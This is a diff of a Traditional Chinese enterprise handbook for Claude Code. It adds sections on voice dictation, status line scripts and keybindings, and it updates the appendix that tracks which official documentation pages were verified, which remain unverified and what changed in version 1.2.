+> 3. **管理員可以用組織政策關閉**（使用者會看到 `Voice mode is disabled by your organization's policy`）。
+> 4. 🚨 **支援的聽寫語言有 20 種（包括日文 `ja`、韓文 `ko`），但查證當日（2026-09-24）的官方清單中沒有中文。** 繁體中文使用者目前**無法以中文語音輸入**，請在內部文件中註明，避免同仁誤以為是設定問題。
+
+其他：轉寫**不消耗 Claude 訊息或 token**，也不計入 `/usage` 的額度；會自動把目前的專案名稱與 git 分支名稱加入辨識提示；聽寫語言沿用 `language` 設定（未設定時為英文）；可以在 `keybindings.json` 以 `voice:pushToTalk` 重新綁定按鍵（hold 模式請避免綁定單一字母鍵）。
+
+### 56.6 Status Line：最便宜的成本與 context 意識工具【Official】
+
+Status line 是介面底部一列**由你的 shell 腳本產生**的內容：Claude Code 以 JSON 經 stdin 提供 session 資料，腳本輸出什麼就顯示什麼。**它在本機執行，不消耗 API token**。
+
+| 設定 | 說明 |
+| --- | --- |
+| 建立 | `/statusline 顯示模型名稱與 context 百分比進度條`，Claude Code 會產生腳本並更新設定；或手動在設定中加入 `statusLine: { type: "command", command: "..." }` |
+| 更新時機 | session 開始、每則新的助理訊息、`/compact` 完成、權限模式或 vim 模式改變、速率限制重置、prompt cache 到期；另外可用 `refreshInterval`（秒）定時更新；更新有 300 ms debounce |
+| 輸出 | 多行、ANSI 顏色、OSC 8 可點擊連結；寬度請讀 `COLUMNS` 環境變數（腳本中無法用 `tput cols`） |
+| 可用資料 | 模型、工作目錄、**context 使用率**、**prompt cache 到期時間**、成本與時長、**速率限制與花費上限**（`rate_limits.spend_limit`，需經 Claude Apps Gateway）、vim 模式等 |
+| Subagent 列 | `subagentStatusLine` 可以自訂每個 subagent 的顯示（包含模型、effort、token 數） |
+| 治理 | 與 hooks 相同，受**工作區信任**、`disableAllHooks`、`allowManagedHooksOnly` 約束 |
+
+> ✅ **企業建議：發佈一份標準的 status line 腳本**，至少顯示「模型、context 使用率、本 session 成本」三項。這是讓開發者**在不看帳單的情況下就意識到成本**最有效的方式，也能搭配第 [13 章](#13-context-window-與-token-最佳化)的 context 管理教育。腳本請以 plugin 或 managed 設定發佈，並避免在腳本中執行耗時指令（`git status` 請加快取）。
+
+### 56.7 快捷鍵自訂（Keybindings）【Official】
+
+執行 `/keybindings` 建立或開啟 `~/.claude/keybindings.json`，**修改後自動生效，不需重新啟動**。
+
+- 結構：`bindings` 陣列，每個區塊指定一個 **context**（`Global`、`Chat`、`Confirmation`、`Transcript`、`DiffPanel`、`ModelPicker`、`Agents`、`Scroll` 等）與「按鍵 → action」的對應；設為 `null` 可取消預設綁定。
+- 語法：修飾鍵用 `+` 連接（`ctrl`、`shift`、`alt`／`meta`／`opt`、`cmd`／`super`）；**和弦**以空白分隔（例如 `ctrl+k ctrl+s`，每一鍵需在 3 秒內按下）；字母不分大小寫。
+- 非美式鍵盤：Ctrl 快捷鍵一律以拉丁字母書寫。Cyrillic 等非拉丁配置在支援 Kitty 鍵盤協定的終端機中，會依**美式鍵盤的實體位置**比對（v2.1.247+）。
+- `cmd` 只在會回報 Super 修飾鍵的終端機中有效，**要跨終端機通用請用 `ctrl` 或 `meta`**。
+- 保留的快捷鍵（例如中斷與離開）無法重新綁定；檔案有錯誤時會顯示驗證訊息。
+
+> ✅ **企業建議**：快捷鍵屬於個人偏好，**不建議由組織強制統一**。但內部教材應以預設快捷鍵撰寫，並在 FAQ 中說明 `/keybindings` 的位置，以及「`chat:newline` 與 `chat:submit` 可以互換」這個最常被詢問的調整。
+
+### 56.8 企業標準化建議清單【建議】
+
+| 項目 | 建議做法 | 設定位置 |
+| --- | --- | --- |
+| 換行鍵 | 教材統一使用 `Ctrl+J`（所有終端機都可用）；VS Code 使用者執行 `/terminal-setup` | onboarding |
+| 渲染模式 | VS Code、tmux 使用者預設全螢幕 | 使用者設定 `tui` |
+| 通知 | 非 Ghostty／Kitty／iTerm2 的終端機設 `preferredNotifChannel: "terminal_bell"` | 使用者設定 |
+| Status line | 發佈標準腳本（模型、context、成本） | plugin 或 managed settings |
+| 無障礙 | 在工具清單中列出螢幕閱讀器模式與三種輔助設定 | 內部無障礙指引 |
+| 語音聽寫 | 依資料分類決定是否以組織政策關閉；註明**不支援中文** | 組織政策 |
+| Windows | Backspace 問題設 `CLAUDE_CODE_BS_AS_CTRL_BACKSPACE=0`；Windows Terminal 殘影設 `CLAUDE_CODE_ALT_SCREEN_FULL_REPAINT=1` | 附錄 [C](#附錄-cwindows-企業環境快速開始) |
+
+### 56.9 本章注意事項
+
+> 🚨 **一、語音聽寫是資料外送。** 錄音會送到 Anthropic 做轉寫。處理機密資料的團隊請先完成評估，或以組織政策關閉。
+
+> ⚠️ **二、語音聽寫目前不支援中文。** 查證當日的 20 種語言中沒有中文，請勿承諾同仁可以用中文語音輸入。
+
+> ⚠️ **三、全螢幕渲染仍是 research preview。** 遇到渲染問題時，先以 `/tui default` 切回，再以 `/feedback` 回報終端機名稱與版本。
+
+> ✅ **四、Status line 是零 token 成本的成本意識工具。** 在推動 AI 成本治理時，它比任何報表都更早讓開發者看到數字。
+
+> 📌 **五、螢幕閱讀器模式不會自動偵測。** 需要的同仁必須自行開啟，onboarding 時請主動告知。
 
 ---
 
@@ -18983,7 +21470,7 @@ A：常見原因：session 開整天不 `/clear`（long context）、中途切�
 
 **Q17：可以用 Bedrock / Vertex / Foundry 嗎？有什麼限制？**
 
-A：可以，但**雲端 session、Routines、Code Review、Remote Control、Chrome、ultrareview 都不可用**（那些需要 claude.ai 帳號）。遙測也預設關閉。詳見第 [4.5 節](#45-enterprise-ai-agent-team-設計)。
+A：可以，但**雲端 session、Routines、Code Review、Remote Control、Chrome、ultrareview 都不可用**（那些需要 claude.ai 帳號）。遙測也預設關閉。詳見第 [4.5 節](#45-一個常被忽略的落差provider-會影響功能可用性official)。
 
 **Q18：怎麼防止 AI 為了讓測試通過而改斷言？**
 
@@ -19003,16 +21490,16 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 
 ### F.1 查證資訊
 
-| 項目 | v1.0 | **v1.1（本版）** |
-| --- | --- | --- |
-| **查證日期** | 2026-09-10 | **2026-09-11** |
-| **母體** | `llms.txt` 當日列出 **166 頁** | 🚨 **250 頁**（一天之內索引擴增 84 頁） |
-| **逐頁覆核** | **64 頁** | **累計 79 頁**（本版新增 **15 頁**，見 F.2.1） |
-| **覆核比例** | 64/166 ≈ 39% | **79/250 ≈ 32%**（母體擴增使比例下降） |
-| **補充查證** | changelog 至 v2.1.267（經網路搜尋） | **逐頁覆核 `changelog`**，確認至 **v2.1.268（2026-09-10）** |
-| **查證方式** | 逐頁抓取 `https://code.claude.com/docs/en/<page>.md` 原文並比對 | 同左 |
+| 項目 | v1.0 | v1.1 | **v1.2（本版）** |
+| --- | --- | --- | --- |
+| **查證日期** | 2026-09-10 | 2026-09-11 | **2026-09-24** |
+| **母體** | `llms.txt` 列出 **166 頁** | 250 頁 | 🚨 **197 頁**（172 頁一般文件 + 25 頁 What's New 週報） |
+| **逐頁覆核** | **64 頁** | 累計 79 頁 | **累計 141 頁**（新增 **62 頁**、重新覆核 **15 頁**，見 F.2.2） |
+| **覆核比例** | 64/166 ≈ 39% | 79/250 ≈ 32% | **141/197 ≈ 72%**（不含 24 頁個別週報時為 141/173 ≈ 82%） |
+| **Changelog** | 至 v2.1.267（經網路搜尋） | 至 v2.1.268 | **逐版覆核 v2.1.269–v2.1.281（2026-09-23）** |
+| **查證方式** | 逐頁抓取 `https://code.claude.com/docs/en/<page>.md` 原文並比對 | 同左 | **一次下載全部 176 個原始 Markdown 檔**（172 頁 + 週報索引與 w35–w37）後逐頁閱讀；另以網路搜尋補充社群研究（標為【Community】） |
 
-> 🚨 **關於覆核比例下降的誠實說明**：v1.1 新覆核了 15 頁，但母體從 166 頁擴增到 250 頁，因此**覆核比例反而由 39% 降到 32%**。本手冊選擇覆核**企業治理、安全與成本**相關頁面，而非追求數字；**未覆核的區塊全部列在 F.3，請務必查閱**。
+> ⚠️ **關於母體頁數 250 → 197 的誠實說明**：v1.1 記載的 250 頁**在 v1.2 無法重現**。2026-09-24 的 `llms.txt` 列出 197 個頁面連結，而 v1.1 已覆核的 79 頁**全部仍然存在**，因此差異可能來自索引重組，或 v1.1 的計數方式不同（例如重複計入）。本手冊無法查證是哪一種原因，所以改以本版實際下載並逐一確認的 **197 頁**為準，並據此重新計算覆核比例。
 
 ### F.2 已逐頁覆核的頁面清單
 
@@ -19051,24 +21538,48 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 | `gateways` | 第 [53 章](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway) |
 | `feature-availability` | 第 [54 章](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry) |
 
+#### F.2.2 v1.2 新增與重新覆核的頁面【本版新增】
+
+**新增逐頁覆核（62 頁）**：
+
+| 分類 | 頁面 | 寫進本手冊的位置 |
+| --- | --- | --- |
+| 新頁面（5） | `agents`、`claude-projects`、`plugin-evals`、`settings-example`、`web-quickstart` | 18.1.1、18.8、21.12、15.7.2、6.6.1 |
+| Agent SDK（29） | `agent-sdk/` 下的 quickstart、configuration、claude-code-features、agent-loop、sessions、session-storage、permissions、user-input、hooks、subagents、custom-tools、mcp、tool-search、skills、plugins、modifying-system-prompts、structured-outputs、streaming-output、streaming-vs-single-mode、file-checkpointing、cost-tracking、observability、todo-tracking、hosting、secure-deployment、migration-guide、troubleshooting、typescript-v2-preview、examples | 43.8–43.20 |
+| Gateway 部署細節（10） | `claude-apps-gateway`、`-config`、`-spend-limits`、`-deploy`、`-on-aws`、`-on-gcp`、`llm-gateway`、`-connect`、`-rollout`、`-protocol` | 53.8–53.14 |
+| Provider 專頁（5） | `third-party-integrations`、`amazon-bedrock`、`claude-platform-on-aws`、`google-vertex-ai`、`microsoft-foundry` | 54.9–54.13 |
+| Self-hosted（6） | `self-hosted-environments-quickstart`、`-deploy`、`-configuration`、`-testing`、`-reference`、`-identity` | 第 55 章 |
+| Interface（6） | `terminal-config`、`fullscreen`、`accessibility`、`voice-dictation`、`statusline`、`keybindings` | 第 56 章 |
+| 週報（1） | `whats-new/index`（涵蓋 w13–w37 的摘要） | 附錄 H |
+
+📌 `agent-sdk/typescript` 與 `agent-sdk/python` 兩頁 API reference **只用於查證選項名稱**，不計入逐頁覆核。其中 `custom-tools`、`structured-outputs`、`streaming-output`、`user-input`、`todo-tracking`、`examples` 以**頁面結構與企業相關段落**覆核，未逐段轉錄範例程式碼。
+
+**重新覆核（15 頁，已在 v1.1 清單中）**：`changelog`（v2.1.269–281）、`memory`（AGENTS.md）、`model-config`（Opus 5.5）、`fast-mode`、`advisor`、`permission-modes`（伺服器端分類器）、`settings-reference`、`env-vars`、`mcp`、`hooks`、`monitoring-usage`、`sandboxing`、`cli-reference`、`self-hosted-environments`、`agent-sdk/overview`。
+
 ### F.3 標示為【⚠️ 文件不一致】或需自行覆核的項目
 
-| # | 項目 | 說明 | 建議做法 |
-| --- | --- | --- | --- |
-| 1 | 競品比較（第 [4.3 節](#43-能力矩陣)）中的 **OpenAI Codex CLI 與 Cursor 欄位** | 本手冊未對其官方文件做同等強度查證，標示為【Community】 | 採購決策前向各廠商官方文件覆核 |
-| 2 | GitHub Copilot 欄位 | 依本文件庫中同日查證的《GitHub Copilot 企業級軟體開發教學手冊》整理，非本手冊直接查證 | 同上 |
-| 3 | 部分 `settings-reference` 的鍵 | 本手冊只覆核了企業最相關的子集，非全部設定鍵 | 完整清單以官方 `settings-reference` 為準 |
-| 4 | Agent SDK 的 API 細節 | 只覆核了 `agent-sdk/overview`，未覆核各語言的完整 API reference | 實作前查閱 `agent-sdk/typescript` 與 `agent-sdk/python` |
-| 5 | 各 Provider（Bedrock / Vertex / Foundry）的**部署細節** | ✅ **v1.1 部分解決**：已覆核 `feature-availability` 並寫成第 [54 章](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry) 的功能矩陣。但**各 Provider 專頁**（`amazon-bedrock`、`claude-platform-on-aws`、`google-vertex-ai`、`microsoft-foundry`、`third-party-integrations`）仍未逐頁覆核 | 部署前查閱各 Provider 專頁 |
-| 6 | Gateway 相關頁面 | ✅ **v1.1 部分解決**：已覆核 `gateways` 並寫成第 [53 章](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)。但**部署細節 9 頁**（`claude-apps-gateway` 及其 `-config`／`-spend-limits`／`-deploy`／`-on-aws`／`-on-gcp`、`llm-gateway` 及其 `-connect`／`-rollout`／`-protocol`）仍未逐頁覆核 | 實際部署 gateway 前查閱該系列 9 頁 |
-| 7 | `chrome`、`mobile`、`artifacts`、`goal`、`discover-plugins`、`plugin-marketplaces`、`plugins-reference`、`plugin-hints`、`managed-mcp`、`github-enterprise-server`、`github-actions-cloud-providers`、`authentication`、`setup`、`devcontainer`、`interactive-mode`、`statusline`、`errors`、`troubleshoot-install`、`debug-your-config`、`glossary`、`zero-data-retention`、`channels-reference`、`security-guidance`、`common-workflows`、`prompt-library`、`quickstart`、`mcp-quickstart`、`hooks-guide`、`deep-links` 以外的 Automation 頁 | 內容從其他已覆核頁面的交互引用取得，未逐頁覆核。📌 **`feature-availability`、`fast-mode`、`advisor` 已於 v1.1 移出本列（改為已覆核）** | 深入使用該功能前查閱該頁 |
-| 8 | **Claude Tag**（見第 [6.8.1 節](#681-claude-in-slackteamenterprise-的退場路徑official)） | ⚠️ **v1.1 更正**：`claude-tag` **已納入** `code.claude.com` 母體索引（v1.0 記載「不在母體索引中」已不正確），但本手冊**仍未逐頁覆核**該頁；完整設定細節位於 `claude.com/docs/claude-tag/*` | Team／Enterprise 導入 Slack 前務必查閱該系列文件並與 Anthropic 客戶團隊確認切換日期 |
-| 9 | **Agent SDK 全系列（約 30 頁）** | 🚨 **v1.1 明確排除**：第 [43 章](#43-agent-sdk-與自建企業-agent-平台) 維持 v1.0 深度，僅覆核 `agent-sdk/overview`。未覆核 `agent-sdk/` 下的 quickstart、custom-tools、permissions、hooks、subagents、skills、structured-outputs、cost-tracking、observability、hosting、secure-deployment、typescript、python 等約 30 頁 | **自建 Agent 平台前必須逐頁查閱**；另見第 [8.7.4 節](#874-法遵與授權邊界officialv11-新增) 的認證紅線 |
-| 10 | **What's New 週報（21 頁）** | 🚨 **v1.1 明確排除**：`whats-new/index` 與 `whats-new/2026-w13` 至 `2026-w34` 未覆核 | 每月覆核節奏中閱讀（見 [F.5](#f5-覆核建議節奏)） |
-| 11 | **Interface 系列（6 頁）** | 🚨 **v1.1 明確排除**：`terminal-config`、`fullscreen`、`accessibility`、`voice-dictation`、`statusline`、`keybindings` 未覆核 | 有無障礙需求或終端機客製需求時查閱 |
-| 12 | **Desktop 系列的其餘頁面** | 已覆核 `desktop-scheduled-tasks`；`desktop-quickstart`、`desktop`、`desktop-linux`、`desktop-wsl`、`desktop-ios-simulator` 未逐頁覆核 | 導入 Desktop App 前查閱 |
-| 13 | **Self-hosted Environments 系列** | 只覆核 `self-hosted-environments`（v1.0）；`-quickstart`、`-deploy`、`-configuration`、`-testing`、`-reference`、`-identity` 共 6 頁未覆核 | 部署 self-hosted runner 前逐頁查閱 |
-| 14 | **`disableDeepLinkRegistration` 對 VS Code `vscode://` 處理器的涵蓋範圍** | 【⚠️ 文件不一致】官方 `deep-links` 頁未說明該設定是否同時涵蓋 VS Code 擴充註冊的處理器（見第 [24.9.5 節](#2495-第二個入口vs-code-擴充official)） | **必須在目標環境實測後才可寫進企業規範** |
+> 📌 **v1.2 狀態欄說明**：✅ 已解決；🟡 部分解決；⬜ 仍未覆核；🆕 本版新發現。
+
+| # | 項目 | 狀態 | 說明 | 建議做法 |
+| --- | --- | --- | --- | --- |
+| 1 | 競品比較（第 [4.3 節](#43-能力矩陣)）中的 **OpenAI Codex CLI 與 Cursor 欄位** | ⬜ | 未對其官方文件做同等強度查證，標為【Community】 | 採購決策前向各廠商官方文件覆核 |
+| 2 | GitHub Copilot 欄位 | ⬜ | 依本文件庫中同日查證的《GitHub Copilot 企業級軟體開發教學手冊》整理 | 同上 |
+| 3 | `settings-reference` 的設定鍵 | 🟡 | v1.2 補查了 `attribution`、`syncClaudeAi*`、`modelPicker`、`blockReadsOutsideWorkingDirectories` 等鍵（第 [15.7 節](#157-v12-新增的企業相關設定official)），但仍非全部 | 完整清單以官方 `settings-reference` 為準 |
+| 4 | Agent SDK 的 API 細節 | 🟡 | v1.2 已覆核 29 頁概念與部署頁（第 43.8–43.20 節）；`typescript`、`python` API reference 只用於查證名稱 | 實作前查閱兩份 API reference |
+| 5 | 各 Provider 的部署細節 | ✅ | v1.2 覆核 5 個 Provider 專頁（第 [54.9–54.13 節](#549-部署選項總覽third-party-integrationsofficialv12-新增)） | — |
+| 6 | Gateway 部署細節 9 頁 | ✅ | v1.2 覆核（第 [53.8–53.14 節](#538-claude-apps-gateway-部署實務定位與開發者連線officialv12-新增)） | — |
+| 7 | 其餘未逐頁覆核的頁面 | ⬜ | `chrome`、`mobile`、`artifacts`、`goal`、`discover-plugins`、`plugin-marketplaces`、`plugins-reference`（僅部分）、`plugin-hints`、`managed-mcp`、`github-enterprise-server`、`github-actions-cloud-providers`、`authentication`、`setup`、`devcontainer`、`interactive-mode`、`errors`、`troubleshoot-install`、`debug-your-config`、`glossary`、`zero-data-retention`、`channels-reference`、`common-workflows`、`prompt-library`、`quickstart`、`mcp-quickstart`、`hooks-guide`。📌 v1.2 已將 `statusline` 移出本列 | 深入使用該功能前查閱該頁 |
+| 8 | **Claude Tag**（第 [6.8.1 節](#681-claude-in-slackteamenterprise-的退場路徑official)） | ⬜ | 已納入母體（`claude-tag`），但仍未逐頁覆核；完整設定位於 `claude.com/docs/claude-tag/*` | Team／Enterprise 導入 Slack 前務必查閱，並與 Anthropic 客戶團隊確認切換日期 |
+| 9 | Agent SDK 全系列 | ✅ | v1.2 解決（見 #4） | — |
+| 10 | What's New 週報 | 🟡 | v1.2 覆核 `whats-new/index`（w13–w37 摘要）並寫成附錄 [H](#附錄-h2026-功能演進時間軸whats-new-w13w37)；**24 頁個別週報未逐頁覆核** | 每月覆核節奏中閱讀新週報 |
+| 11 | Interface 系列 6 頁 | ✅ | v1.2 覆核並寫成第 [56 章](#56-終端機介面無障礙與個人化v12-新增) | — |
+| 12 | Desktop 系列的其餘頁面 | ⬜ | `desktop-quickstart`、`desktop`、`desktop-linux`、`desktop-wsl`、`desktop-ios-simulator` | 導入 Desktop App 前查閱 |
+| 13 | Self-hosted Environments 6 頁 | ✅ | v1.2 覆核並寫成第 [55 章](#55-self-hosted-environments-部署實務v12-新增) | — |
+| 14 | `disableDeepLinkRegistration` 對 VS Code `vscode://` 處理器的涵蓋範圍 | ⬜ | 【⚠️ 文件不一致】官方 `deep-links` 頁未說明（第 [24.9.5 節](#2495-第二個入口vs-code-擴充official)） | **必須在目標環境實測後才可寫進企業規範** |
+| 15 | 🆕 **逐指令 `allowed_domains`**（v2.1.271） | 🆕 | 【⚠️ 文件不一致】`auto-mode-config` 頁連結到 `sandboxing#per-command-allowed-domains-in-auto-mode`，但查證當日 `sandboxing` 頁**沒有這一節**（第 [23.12.1 節](#23121-v21269281-的沙箱變更officialv12-新增)） | 以 changelog 描述為準，實測後再寫進規範 |
+| 16 | 🆕 **Gateway 的 `assume_role` 與 `guardrail`**（v2.1.281） | 🆕 | 【⚠️ 文件不一致】只出現在 changelog，`claude-apps-gateway-config` 尚未收錄（第 [53.9.1 節](#5391-上游與-failoverofficial)） | 以 gateway 的 `GET /protocol` 或實測確認語法 |
+| 17 | 🆕 **危險 `rm` 相關環境變數** | 🆕 | 【⚠️ 文件不一致】`CLAUDE_CODE_DISABLE_DANGEROUS_RM_TIMEOUT`、`CLAUDE_CODE_DISABLE_SUBSTITUTION_RM_PROMPT` 只出現在 changelog，`env-vars` 頁未列（第 [22.4.1 節](#2241-v21269281-的權限行為變更officialv12-新增)） | 實測後再寫進規範 |
+| 18 | 🆕 **母體頁數 250 → 197** | 🆕 | v1.1 的 250 頁在 v1.2 無法重現（見 F.1） | 下次覆核時以 `llms.txt` 的實際連結數為準 |
 
 ### F.4 已知會隨版本改變、需定期覆核的項目
 
@@ -19092,13 +21603,19 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 | 16 | 🆕 **Provider 功能可用性矩陣** | 官方 `feature-availability` 是最常變動的頁面之一；**採購決策前必須重新覆核**（第 [54 章](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)） |
 | 17 | 🆕 **官方文件母體頁數** | 🚨 **一天之內由 166 頁增為 250 頁**。母體本身的變動速度就是「本手冊會過時多快」的最佳指標 |
 | 18 | 🆕 **Cloud environments 與 API 憑證的方案可用性** | API 憑證目前「Team／Enterprise 尚不支援」，官方用詞為 *yet*，顯示會變（第 [7.8.3 節](#783-環境變數與-api-憑證兩者的安全性差異official)） |
+| 19 | 🆕 v1.2 **Project instructions（AGENTS.md 讀取規則）** | v2.1.277 新增、v2.1.281 才涵蓋 Bedrock 與關閉遙測的 session，行為仍在擴張（第 [14.8 節](#148-agentsmd-相容official)） |
+| 20 | 🆕 v1.2 **各方案的預設模型與預設 effort** | v2.1.280 一次改變 Pro／Team Standard 的預設模型，Opus 5.5 的預設 effort 又是 `medium`，**直接影響成本**（第 [5.2](#52-模型與別名official)、[5.4 節](#54-effort-level推理投入程度official)） |
+| 21 | 🆕 v1.2 **auto mode 分類器的執行位置** | v2.1.273 先改為第三方用本機、v2.1.278 又改為預設伺服器端，**兩週內改了兩次**（第 [2.2.3 節](#223-auto-mode-的分類器到底擋什麼official)） |
+| 22 | 🆕 v1.2 **Claude Projects 的方案可用性與組織控制** | 目前僅 Pro／Max public beta、沒有組織控制，**開放給 Team／Enterprise 時治理模型會改變**（第 [18.8 節](#188-claude-projects雲端長期專案協調previewv12-新增)） |
+| 23 | 🆕 v1.2 **語音聽寫支援的語言** | 查證當日不含中文，未來可能新增（第 [56.5 節](#565-語音聽寫voice-dictationofficial)） |
+| 24 | 🆕 v1.2 **Fast Mode 的 Opus 5.5 定價** | $8／$40 per MTok 與舊模型不同，且仍為 research preview（第 [5.11 節](#511-fast-mode高速模式preview)） |
 
 ### F.5 覆核建議節奏
 
 | 頻率 | 做什麼 |
 | --- | --- |
 | **每月** | 讀官方 changelog 與 What's New；更新 `requiredMinimumVersion` |
-| **每季** | 重新覆核 F.4 的 **18 個項目**；重跑紅隊演練；檢視 managed settings；**執行 `/skill-doctor` 清理未使用的 skill**（第 [13.6.1 節](#1361-skill-doctor找出白佔-context-的-skillofficialv11-新增)） |
+| **每季** | 重新覆核 F.4 的 **24 個項目**；重跑紅隊演練；檢視 managed settings；**執行 `/skill-doctor` 清理未使用的 skill**（第 [13.6.1 節](#1361-skill-doctor找出白佔-context-的-skillofficialv11-新增)） |
 | **每半年** | 全面覆核本手冊；更新 F.2 清單；**重新抓取 `llms.txt` 比對母體頁數變化** |
 | **重大版本** | 對照 release notes 逐項確認本手冊的【Official】標記是否仍成立 |
 
@@ -19139,7 +21656,7 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 
 #### F.6.3 本版**明確排除**、留待後續版本的範圍
 
-為維持本手冊「**不虛構、查不到就明寫**」的原則，以下區塊本版**未覆核**，已完整列於 [F.3](#f3-標示為️-文件不一致或需自行覆核的項目) 第 9–13 項：
+為維持本手冊「**不虛構、查不到就明寫**」的原則，以下區塊本版**未覆核**，已完整列於 [F.3](#f3-標示為-文件不一致或需自行覆核的項目) 第 9–13 項：
 
 - **Agent SDK 全系列（約 30 頁）**——第 43 章維持 v1.0 深度
 - **What's New 週報（21 頁）**
@@ -19148,6 +21665,53 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 - **各 Provider 專頁 4 頁**（第 54 章只覆核了 `feature-availability` 的矩陣）
 
 > 🎯 **給讀者的一句話**：本手冊覆核了 250 頁中的 79 頁，**選的是企業治理、安全與成本相關的部分**。**F.3 的未覆核清單和已覆核的內容一樣重要**——它告訴你哪些地方不能只信本手冊。
+
+### F.7 v1.2 變更摘要
+
+**查證日期 2026-09-24；基準版本 v2.1.281。**
+
+#### F.7.1 已過時、本版予以更正的事實
+
+| # | v1.1 的記載 | v1.2 更正 | 位置 |
+| --- | --- | --- | --- |
+| 1 | 🚨「Claude Code 只讀 `CLAUDE.md`，不讀 `AGENTS.md`」 | **v2.1.277 起會直接讀 `AGENTS.md`**（沒有 `CLAUDE.md` 時）；新增 Project instructions 設定 | Version Note 3、第 [14.8 節](#148-agentsmd-相容official) |
+| 2 | 預設模型：Pro／Team Standard 為 Sonnet 5，其餘為 Opus 5 | **v2.1.280 起全部預設 Opus 5.5**（Foundry 除外） | 第 [5.2 節](#52-模型與別名official) |
+| 3 | 所有模型的預設 effort 都是 `high` | **Opus 5.5 預設 `medium`**、Opus 4.7 預設 `xhigh`；頂層 `effortLevel` 對 Opus 5.5 不生效 | 第 [5.4 節](#54-effort-level推理投入程度official) |
+| 4 | Fast Mode 只支援 Opus 5 與 4.8，$10／$50 | **支援 Opus 5.5，$8／$40**；預設為 Opus 5.5 | 第 [5.11 節](#511-fast-mode高速模式preview) |
+| 5 | Advisor 配對：「Opus 4.7 或更新」一列 | Opus 5.5／5 的主模型**不接受 Opus 4.7／4.8 顧問** | 第 [5.12.3 節](#5123--主模型與顧問模型的配對矩陣official) |
+| 6 | 自動換模型只涉及 Fable 與 Opus 5 | **Opus 5.5 也會觸發**，而它現在是預設模型 | 第 [5.13 節](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增) |
+| 7 | Hook 事件表：`PreCompact` 的 exit 2 為「全部忽略」等 4 處 | **`PreCompact` 會阻擋壓縮**、`PostToolBatch` 會中止 loop、`ConfigChange` 無法阻擋 `policy_settings` 等；並補上 5 個事件 | 第 [19.2 節](#192-hook-事件完整清單official) |
+| 8 | 企業最低版本建議 v2.1.268 | **v2.1.281**（混用 server-managed 與 MDM 者至少 v2.1.273） | 第 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增) |
+| 9 | 母體 250 頁 | **197 頁** | F.1 |
+| 10 | 2 處連結文字寫「4.5 節」卻指向第 45 章 | 改為指向第 4.5 節 | 第 5.1 節、附錄 E |
+
+#### F.7.2 新增的章節與小節
+
+| 位置 | 新增內容 | 為什麼重要 |
+| --- | --- | --- |
+| [2.2.3](#223-auto-mode-的分類器到底擋什麼official) | 伺服器端分類器 | gateway 可能讓審查靜默退回計費的本機分類器 |
+| [2.3.2](#232-v21269--v21281-補充速覽officialv12-新增) | v2.1.269–281 速覽 | 5 項權限繞過與 1 項治理失效的修正 |
+| [6.6.1](#661-github-連線的兩條路徑與企業控管officialv12-新增) | 雲端 session 的 GitHub 連線 | `/web-setup` 會把 `gh` token 送給 Anthropic |
+| [15.7](#157-v12-新增的企業相關設定official) | 新設定鍵與 `--restricted` | `syncClaudeAiSkills` 是一條繞過私有 marketplace 的擴充來源 |
+| [18.1.1](#1811-官方五種平行執行方式的新分類officialv12-新增)、[18.8](#188-claude-projects雲端長期專案協調previewv12-新增) | 官方新分類與 Claude Projects | Projects 目前沒有組織控制 |
+| [20.11](#2011-mcp-2026-07-28-協定與-v12-新增控制officialv12-新增) | MCP 2026-07-28 協定 | URL-mode elicitation 可能成為釣魚入口；OAuth issuer 驗證 |
+| [21.12](#2112-plugin-evals以-eval-套件驗證-pluginofficialv12-新增) | Plugin Evals | 內部 plugin 上架前的品質閘門 |
+| [22.4.1](#2241-v21269281-的權限行為變更officialv12-新增)、[23.12.1](#23121-v21269281-的沙箱變更officialv12-新增) | 權限與沙箱的變更 | `excludedCommands` 複合指令繞過等修正 |
+| [41.6](#416-v12-補齊的遙測訊號與政策驗證officialv12-新增) | 補齊 16 個遙測事件與 `managed_settings_resolved` | **以遙測證明政策生效**（政策漂移偵測） |
+| [43.8–43.20](#438-sdk-的本質一個受監管的-cli-子行程officialv12-新增) | Agent SDK 深化（13 節） | 權限評估順序、多租戶隔離、SessionStore、安全部署、參考架構 |
+| [50.7](#507-業界導入經驗與研究v12-新增community) | 業界研究與社群實務 | Microsoft Research 的 +24% PR 研究與其限制 |
+| [53.8–53.14](#538-claude-apps-gateway-部署實務定位與開發者連線officialv12-新增) | Gateway 部署實務（7 節） | 私有網路限制、parent settings 陷阱、spend limits、WAF 陷阱 |
+| [54.9–54.13](#549-部署選項總覽third-party-integrationsofficialv12-新增) | 各 Provider 部署細節 | 未釘選模型就會以 Opus 單價計費；Foundry 沒有啟動檢查 |
+| [第 55 章](#55-self-hosted-environments-部署實務v12-新增) | Self-hosted Environments 部署實務 | 十項強化、session JWT 驗證、v2.1.281 的 wrapper 破壞性變更 |
+| [第 56 章](#56-終端機介面無障礙與個人化v12-新增) | 終端機介面、無障礙與個人化 | 螢幕閱讀器模式；**語音聽寫會外送錄音且不支援中文** |
+| [附錄 H](#附錄-h2026-功能演進時間軸whats-new-w13w37) | 2026 功能演進時間軸 | 判斷網路文章是否過時 |
+| 目錄 | 改為「部 → 章 → 節」三層可展開目錄 | 所有章節皆可直接連結 |
+
+#### F.7.3 仍未覆核的範圍
+
+見 F.3 狀態為 ⬜ 與 🟡 的項目，主要是：**Claude Tag 系列**、**Desktop 系列 5 頁**、**約 26 頁個別功能頁**（F.3 #7）、**24 頁個別週報**，以及 Agent SDK 的兩份完整 API reference。
+
+> 🎯 **給讀者的一句話**：v1.2 把覆核比例從 32% 提高到 72%，但 **Claude Code 兩週內就發布了 13 個版本**，其中包含一個推翻本手冊 Version Note 的變更（AGENTS.md）。**請把附錄 F.5 的覆核節奏當成真的在執行的流程，而不是參考建議。**
 
 ---
 
